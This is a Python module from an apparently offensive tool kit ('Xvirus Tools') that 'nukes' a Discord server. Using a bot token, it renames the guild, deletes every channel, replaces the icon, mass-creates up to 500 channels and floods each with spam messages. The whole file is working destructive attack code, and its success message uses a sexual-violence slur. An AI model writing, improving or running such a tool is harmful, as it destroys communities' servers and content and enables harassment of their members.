import asyncio
import concurrent.futures
import os
import random
import re
import tempfile
import time

import aiohttp
import discord
import requests
from colorama import Fore

from  util.plugins.common import *


async def process_channel(channel, message_content, message_repetitions):
    if isinstance(channel, discord.TextChannel):
        for _ in range(message_repetitions):
            try:
                await channel.send(message_content)
            except aiohttp.client_exceptions.ServerDisconnectedError:
                await asyncio.sleep(1)
                await channel.send(message_content)


async def servernuke():
    SetTitle("Server Nuker")
    TOKEN = input(f"{Fore.RED} <~> Bot Token: {Fore.BLUE}")
    server_id = int(input(f'{Fore.RED} <~> The ID of the server to nuke (make sure the bot is in the server):{Fore.BLUE} '))
    new_server_name = input(f'{Fore.RED} <~> The new server name:{Fore.BLUE} ')
    image_link = input(f'{Fore.RED} <~> The image link for the server icon:{Fore.BLUE} ')
    channel_name = input(f'{Fore.RED} <~> The name for the new channels:{Fore.BLUE} ')
    channel_count = int(input(f'{Fore.RED} <~> The number of channels to create (max is 500):{Fore.BLUE} '))
    message_content = input(f'{Fore.RED} <~> The message to send to all channels:{Fore.BLUE} ')
    message_repetitions = int(input(f'{Fore.RED} <~> The number of times to send the message (The bigger the number the slower it works):{Fore.BLUE} '))

    intents = discord.Intents.default()
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        print(f'{Fore.BLUE} <*> Logged in as {client.user.name}')
        print(f'{Fore.RED}------------')

        playing_text = "Bot Hosted Using Xvirus Tools"
        playing_link = "https://xvirus.lol/"
        await client.change_presence(activity=discord.Game(name=f"{playing_text} | {playing_link}"))

        selected_server = discord.utils.find(lambda s: s.id == server_id, client.guilds)

        if selected_server:
            print(f'{Fore.BLUE} <*> Selected server: {selected_server.name}')
            print(f'{Fore.BLUE} <*> Bot is in the server: {selected_server.name}')
        else:
            input(f'{Fore.RED} <!> Invalid server ID. Bot is not a member of the specified server.')
            await client.close()
            return

        await selected_server.edit(name=new_server_name)
        print(f'{Fore.BLUE} <*> Server name changed to: {new_server_name}')

        for channel in selected_server.channels:
            await channel.delete()
            print(f'{Fore.BLUE} <*> Deleted channel: {channel.name}')

        async with aiohttp.ClientSession() as session:
            session.proxies = proxy()

            async with session.get(image_link) as response:
                if response.status == 200:
                    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as temp_file:
                        temp_file.write(await response.read())
                        temp_file_path = temp_file.name

                    with open(temp_file_path, 'rb') as f:
                        await selected_server.edit(icon=f.read())
                        print(f'{Fore.BLUE} <*> Server icon changed')

        with concurrent.futures.ThreadPoolExecutor() as executor:
            loop = asyncio.get_event_loop()
            tasks = []
            for i in range(channel_count):
                channel = await selected_server.create_text_channel(f'{channel_name} {i+1}')
                tasks.append(
                    loop.create_task(process_channel(channel, message_content, message_repetitions))
                )
                print(f'{Fore.BLUE} <*> Created channel: {channel.name}')

            await asyncio.gather(*tasks) 
            print(f'{Fore.BLUE} <*> Sent messages to all channels')

        print(f"{Fore.BLUE} <*> Successfully Raped The Guild\n")
        

    await client.start(TOKEN)

def servernuker():
    asyncio.run(servernuke())